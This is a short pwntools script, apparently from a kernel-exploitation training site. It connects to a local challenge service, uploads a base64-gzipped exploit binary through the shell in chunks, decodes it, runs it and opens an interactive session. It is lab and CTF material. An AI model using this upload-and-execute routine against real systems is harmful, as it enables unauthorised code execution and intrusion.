#
# This script is from https://p3land.smallkirby.com/
#

#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys,os

exploit_bin = "exploit.gz.b64"

## exploit ###########################################

def exploit():
  global c

  with open(exploit_bin, 'r') as f:
    binary = f.read()

  progress = 0
  N = 0x300

  c.sendlineafter('$', 'cd /tmp')

  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if progress % N == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
  c.sendlineafter('$', 'gunzip ./exploit.gz')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', './exploit')

## main ##############################################

if __name__ == "__main__":
    global c
    c = remote("localhost", 19965)
    exploit()
    c.interactive()
